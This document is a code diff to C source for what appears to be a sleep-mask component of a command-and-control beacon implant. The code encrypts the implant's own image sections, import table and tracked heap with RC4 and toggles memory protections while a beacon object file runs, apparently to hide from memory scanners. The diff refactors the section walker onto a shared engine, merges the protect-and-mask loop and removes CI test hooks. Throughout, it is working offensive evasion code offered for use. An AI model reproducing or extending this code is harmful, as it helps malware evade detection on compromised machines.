@@ -43,6 +43,7 @@
 #include <windows.h>
 #include <string.h>
 #include "sleepmask_bofwin.h"
+#include "sleepmask_gen3.h"
 
 #if defined(BW_TRACE_ENABLE)
 #include <stdio.h>
@@ -170,23 +171,6 @@ static BOOL bw_page_usable(void * p, DWORD * prot)
 	return TRUE;
 }
 
-/* flip every non-.text block to RW (the .text flip happens inside
- * enter_stub, after the mask loop no longer needs .text executable;
- * returns FALSE on failure - caller must undo) */
-static BOOL bw_blocks_to_rw(BW_BLOCK * blocks, int n, int text_idx)
-{
-	int i;
-	DWORD old = 0;
-
-	for (i = 0; i < n; i++) {
-		if (i == text_idx)
-			continue;
-		if (!VirtualProtect(blocks[i].ptr, blocks[i].len, PAGE_READWRITE, &old))
-			return FALSE;
-	}
-	return TRUE;
-}
-
 /* restore the recorded protections; plain C - only ever called from the
  * window teardown, after the exit stub put .text back (so IAT works) */
 static void bw_blocks_restore(BW_BLOCK * blocks, int n, int text_idx)
@@ -207,160 +191,31 @@ static void bw_blocks_restore(BW_BLOCK * blocks, int n, int text_idx)
  * masks it separately and the exit stub restores it first. */
 static int bw_snapshot(BW_BLOCK * out, int max, void * image, int * text_idx)
 {
-	unsigned char * pe = (unsigned char *)image;
-	unsigned char * img_hi;
-	DWORD lfanew, secoff, sizeimg, text_va = 0, text_end = 0;
-	WORD nsec, optsz, i;
-	int n = 0;
-	HEAP_RECORD * hr;
+	DWORD text_span[2];
+	int n, t;
 
-	*text_idx = -1;
-	if (pe == NULL || pe[0] != 'M' || pe[1] != 'Z')
+	/* the g3 engine already walks our own PE (header page, writable
+	 * non-.text sections, tracked heap with the in-image dedup rules) -
+	 * reuse it instead of a second parser */
+	(void)image;
+	n = g3_snapshot_for_bofwin(out, max, text_span);
+	if (n <= 0)
 		return 0;
-	lfanew = *(DWORD *)(pe + 0x3C);
-	if (*(DWORD *)(pe + lfanew) != 0x00004550)
+	if (text_span[0] == 0 || text_span[1] <= text_span[0])
 		return 0;
-	nsec    = *(WORD *)(pe + lfanew + 6);
-	optsz   = *(WORD *)(pe + lfanew + 20);
-	secoff  = lfanew + 24 + optsz;
-	sizeimg = *(DWORD *)(pe + lfanew + 24 + 0x38);
-	img_hi  = pe + sizeimg;
 
-	for (i = 0; i < nsec && n + 3 < max; i++) {
-		unsigned char * so = pe + secoff + (DWORD)i * 40;
-		DWORD vsz  = *(DWORD *)(so + 8);
-		DWORD raw  = *(DWORD *)(so + 16);
-		DWORD va   = *(DWORD *)(so + 12);
-		DWORD span = vsz > raw ? vsz : raw;
-		BOOL  is_text   = (memcmp(so, ".text", 5) == 0);
-		BOOL  is_unwind = (memcmp(so, ".pdata", 6) == 0) ||
-		                  (memcmp(so, ".xdata", 6) == 0) ||
-		                  (memcmp(so, ".reloc", 6) == 0);
-
-		if (span == 0 || is_unwind)
-			continue; /* exception dispatch + loader tables stay plaintext */
-		if (is_text) {
-			if (text_va != 0)
-				continue; /* first .text wins */
-			text_va = va;
-			text_end = va + span;
-			continue; /* appended after the loop */
-		}
-		/* expand the section across its ACTUAL committed regions: a section's
-		 * VirtualSize can end inside an alignment gap page (PAGE_NOACCESS),
-		 * and a single span covering the gap faults the RC4 write at the
-		 * tail (the .rdata crash, 114KB block). Each region keeps its own
-		 * recorded protection for the restore. */
-		{
-			DWORD off = va;
-			DWORD end = va + span;
-			while (off < end && n + 3 < max) {
-				MEMORY_BASIC_INFORMATION mbi;
-				DWORD rstart, rlen;
-				if (!VirtualQuery(pe + off, &mbi, sizeof(mbi)))
-					break;
-				if (mbi.State != MEM_COMMIT)
-					break;
-				rstart = (DWORD)((unsigned char *)mbi.BaseAddress - pe);
-				rlen = (DWORD)mbi.RegionSize;
-				if (rstart < off) {
-					rlen -= (off - rstart);
-					rstart = off;
-				}
-				if (rstart + rlen > end)
-					rlen = end - rstart;
-				if (rlen == 0)
-					break;
-				if (mbi.Protect == PAGE_NOACCESS || (mbi.Protect & PAGE_GUARD))
-					break; /* gap: stop the expansion here, tail stays plaintext */
-				out[n].ptr = pe + rstart;
-				out[n].len = rlen;
-				out[n].orig_prot = mbi.Protect;
-				n++;
-				off = rstart + rlen;
-			}
-		}
+	/* append .text (single committed region clamp, same as g3 keeps for
+	 * its own exclusions); the enter stub masks it LAST via ctx->u_text */
+	t = n;
+	if (t < max && bw_page_usable((unsigned char *)gparms->beacon_ptr + text_span[0],
+	                              &out[t].orig_prot)) {
+		out[t].ptr = (unsigned char *)gparms->beacon_ptr + text_span[0];
+		out[t].len = text_span[1] - text_span[0];
+		*text_idx = t;
+		n++;
 	}
-
-	/* the header page (everything below the first section) is data - mask
-	 * it too; prepend without disturbing the section order */
-	{
-		DWORD first = text_va ? text_va : 0x1000;
-
-		DWORD hprot = 0;
-
-		if (first > 0 && bw_page_usable(pe, &hprot)) {
-			memmove(&out[1], &out[0], (size_t)n * sizeof(BW_BLOCK));
-			out[0].ptr = pe;
-			out[0].len = first;
-			out[0].orig_prot = hprot;
-			n++;
-		}
-	}
-
-	if (text_va != 0) {
-		/* same region expansion for .text (clamped to committed memory) */
-		int t_start = n;
-		DWORD off = text_va;
-		while (off < text_end && n + 2 < max) {
-			MEMORY_BASIC_INFORMATION mbi;
-			DWORD rstart, rlen;
-			if (!VirtualQuery(pe + off, &mbi, sizeof(mbi)))
-				break;
-			if (mbi.State != MEM_COMMIT)
-				break;
-			rstart = (DWORD)((unsigned char *)mbi.BaseAddress - pe);
-			rlen = (DWORD)mbi.RegionSize;
-			if (rstart < off) {
-				rlen -= (off - rstart);
-				rstart = off;
-			}
-			if (rstart + rlen > text_end)
-				rlen = text_end - rstart;
-			if (rlen == 0 || mbi.Protect == PAGE_NOACCESS || (mbi.Protect & PAGE_GUARD))
-				break;
-			out[n].ptr = pe + rstart;
-			out[n].len = rlen;
-			out[n].orig_prot = mbi.Protect;
-			n++;
-			off = rstart + rlen;
-			break; /* ONLY the first committed region is stub-masked: a
-			        * multi-region .text tail stays plaintext by design -
-			        * masking it would hit code C is executing */
-		}
-		if (n > t_start)
-			*text_idx = t_start;
-		else
-			return 0; /* no .text to protect -> no meaningful window */
-	}
-	else {
-		return 0; /* no .text to protect -> no meaningful window */
-	}
-
-	/* tracked heap: the g3 dedup rules - a record fully inside the image is
-	 * redundant (its section block covers it) and double-encrypting an
-	 * overlap corrupts it (per-block RC4 keys are not order-independent -
-	 * the round-12 lesson) */
-	hr = track_memory_get_heap_records_to_mask();
-	while (n < max && hr != NULL && hr->ptr != NULL) {
-		unsigned char * hp = (unsigned char *)hr->ptr;
-		unsigned char * he = hp + hr->size;
-
-		if (hr->size > 0 && hr->size < 0x40000000) {
-			if (!(hp >= pe && he <= img_hi)) {
-				if (hp < pe && he > pe)
-					he = pe;
-				if (hp < img_hi && he > img_hi)
-					hp = img_hi;
-				if (hp < he && bw_page_usable(hp, &out[n].orig_prot)) {
-					out[n].ptr = hp;
-					out[n].len = (unsigned long)(he - hp);
-					n++;
-				}
-			}
-		}
-		hr++;
-	}
+	if (*text_idx < 0)
+		return 0;
 	return n;
 }
 
@@ -679,19 +534,6 @@ BOOL bofwin_supported(void)
 	return bw_build_pages();
 }
 
-void * bofwin_test_stub_page(void);
-void * bofwin_test_stub_page(void)
-{
-	return g_bw_stubs; /* CI diagnostics: dump the built page, verify the
-	                    * bytes match the capstone mirror offline */
-}
-
-int bofwin_test_phase(void);
-int bofwin_test_phase(void)
-{
-	return (g_bw_ctx != NULL) ? (int)g_bw_ctx->phase : -1;
-}
-
 BOOL bofwin_window(void (*entry)(void *, int), void * args, int alen, DWORD watchdog_ms)
 {
 	BW_SF032 fn;
@@ -766,23 +608,22 @@ BOOL bofwin_window(void (*entry)(void *, int), void * args, int alen, DWORD watc
 		return FALSE; /* no watchdog -> no window (nothing masked yet) */
 	BW_TRACE("watchdog timer armed");
 
-	/* flip the non-.text blocks to RW, then mask them - plain RC4 loops,
-	 * .text stays plaintext and executable until enter_stub */
-	if (!bw_blocks_to_rw(blocks, nblocks, text_idx)) {
-		bw_blocks_restore(blocks, nblocks, text_idx);
-		DeleteTimerQueueTimer(NULL, timer, NULL);
-		ctx->state = BW_STATE_IDLE;
-		return FALSE;
-	}
-	BW_TRACE("blocks flipped RW");
-	/* NO TRACE BEYOND THIS POINT: once .rdata is masked, every IAT slot is
-	 * ciphertext - the next fprintf (or a VEH calling WriteFile) faults on
-	 * its own import table. The window is dark until the exit stub returns. */
+	/* flip each non-.text block to RW and mask it in one pass; .text stays
+	 * plaintext and executable until enter_stub */
 	for (i = 0; i < nblocks; i++) {
-		if (i != text_idx)
-			bw_rc4(fn, blocks[i].ptr, blocks[i].len, ctx->key2, key, (unsigned int)i);
+		DWORD oldp = 0;
+		if (i == text_idx)
+			continue;
+		if (!VirtualProtect(blocks[i].ptr, blocks[i].len, PAGE_READWRITE, &oldp)) {
+			bw_blocks_restore(blocks, nblocks, text_idx);
+			DeleteTimerQueueTimer(NULL, timer, NULL);
+			ctx->state = BW_STATE_IDLE;
+			return FALSE;
+		}
+		bw_rc4(fn, blocks[i].ptr, blocks[i].len, ctx->key2, key, (unsigned int)i);
 	}
-	ctx->phase = 2; /* all but .text masked */
+	ctx->phase = 2; /* all but .text masked; NO API CALLS from here until the
+	                 * exit stub returns (.rdata and the IAT are ciphertext) */
 
 	/* from here to the exit stub this thread may only touch: stack, ctx
 	 * page, stub page. enter_stub flips .text to RW, masks it (last block),
